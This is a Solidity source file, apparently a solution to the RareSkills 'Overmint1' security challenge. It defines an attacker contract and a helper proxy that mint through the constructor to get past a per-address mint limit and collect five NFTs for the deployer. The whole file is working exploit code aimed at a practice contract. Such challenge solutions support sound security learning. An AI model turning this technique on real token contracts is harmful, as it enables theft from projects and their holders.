// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

//@author Tommaso Galantini
// Contract to attack the Overmint1 Rareskills riddle 

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IOvermint {
    function mint() external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
}

contract OptimizedAttacker is IERC721Receiver {
    IOvermint public overmint1;
    address public recipient;

    constructor(address _overmint1) {
        overmint1 = IOvermint(_overmint1); 
        recipient = msg.sender; 
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {

        for (uint256 i = 0; i < 4; i++) {
            overmint1.mint();
        }
        new MintProxy(address(overmint1), address(this));

        for (uint256 i = 1; i <= 5; i++) {
            overmint1.transferFrom(address(this), recipient, i);
        }
    }
}

contract MintProxy is IERC721Receiver {
    constructor(address _overmint1, address _recipient) {
        IOvermint overmint1 = IOvermint(_overmint1);
        
        overmint1.mint();
        

        uint256 tokenId = overmint1.totalSupply();
        overmint1.transferFrom(address(this), _recipient, tokenId);
    
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
